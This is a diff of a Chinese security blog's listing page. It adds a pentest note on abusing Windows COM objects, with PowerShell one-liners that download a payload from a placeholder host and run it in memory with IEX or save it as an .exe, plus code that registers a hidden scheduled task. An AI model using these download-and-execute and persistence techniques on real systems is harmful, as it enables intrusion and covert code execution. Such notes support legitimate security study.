@@ -117,6 +117,134 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
 		</h3>
 		</div>
@@ -491,82 +619,6 @@ mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-12-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -618,7 +670,7 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>6</span></a></li>
+			<li><a href="/categories/Java/">Java<span>7</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -645,6 +697,10 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
       </li>
     
@@ -658,10 +714,6 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
     
       <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
       </li>
     
   </ul>
